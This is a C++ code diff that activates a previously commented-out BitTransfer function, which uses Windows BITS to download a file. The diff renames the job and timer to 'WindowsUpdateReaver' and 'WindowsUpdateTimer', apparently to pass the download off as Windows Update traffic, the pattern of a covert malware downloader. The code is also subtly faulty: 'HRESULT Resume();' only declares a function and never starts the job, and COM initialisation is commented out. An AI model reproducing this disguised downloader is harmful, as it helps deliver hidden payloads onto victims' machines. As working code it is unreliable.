@@ -8,11 +8,10 @@ using namespace std;
 
 VOID BitTransfer(PWCHAR pSource, PWCHAR pDest)
 {
-	/*
 	IBackgroundCopyManager* g_XferManager = NULL;  
-	HRESULT hr;
+	HRESULT hr = S_OK;
 
-	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+	//hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 	if (SUCCEEDED(hr))
 	{
 		//MessageBox(NULL, L"HRESULT succeeded", L"BUBU", 0);
@@ -24,12 +23,15 @@ VOID BitTransfer(PWCHAR pSource, PWCHAR pDest)
 		{
 			//MessageBox(NULL, L"Connected to the BITS service", L"BUBU", 0);
 		}
+		else 
+			return;
 	}
+	else
+		return;
 
 	GUID JobId;
 	IBackgroundCopyJob* pJob = NULL;
-
-	hr = g_XferManager->CreateJob(L"UpdJob", BG_JOB_TYPE_DOWNLOAD, &JobId, &pJob);
+	hr = g_XferManager->CreateJob(L"WindowsUpdateReaver", BG_JOB_TYPE_DOWNLOAD, &JobId, &pJob);
 	if (SUCCEEDED(hr))
 	{
 		//MessageBox(NULL, L"Job created", L"BUBU", 0);
@@ -39,7 +41,11 @@ VOID BitTransfer(PWCHAR pSource, PWCHAR pDest)
 		{
 			//MessageBox(NULL, L"ile added to job", L"BUBU", 0);
 		}
+		else
+			goto cleanup;
 	}
+	else
+		return;
 
 	HRESULT Resume();
 	//MessageBox(NULL, L"Started", L"BUBU", 0);
@@ -49,7 +55,7 @@ VOID BitTransfer(PWCHAR pSource, PWCHAR pDest)
 	LARGE_INTEGER liDueTime;
 
 	liDueTime.QuadPart = -10000000;  //Poll every 1 second
-	hTimer = CreateWaitableTimer(NULL, FALSE, L"UpdTimer");
+	hTimer = CreateWaitableTimer(NULL, FALSE, L"WindowsUpdateTimer");
 	SetWaitableTimer(hTimer, &liDueTime, 1000, NULL, NULL, 0);
 
 	do
@@ -60,6 +66,7 @@ VOID BitTransfer(PWCHAR pSource, PWCHAR pDest)
 		hr = pJob->GetState(&State);
 		if (FAILED(hr))
 		{
+			goto cleanup;
 			//Handle error
 			//MessageBox(NULL, L"FAIL", L"BUBU", 0);
 		}
@@ -105,11 +112,15 @@ VOID BitTransfer(PWCHAR pSource, PWCHAR pDest)
 		BG_JOB_STATE_ERROR != State &&
 		BG_JOB_STATE_TRANSIENT_ERROR != State);
 
-	pJob->Complete();
-	CancelWaitableTimer(hTimer);
-	CloseHandle(hTimer);
+cleanup:
+	if (pJob)
+		pJob->Complete();
+	if (hTimer)
+	{
+		CancelWaitableTimer(hTimer);
+		CloseHandle(hTimer);
+	}
 
 	//MessageBox(NULL, L"DONE", L"BUBU", 0);
-	*/
 	return;
 }
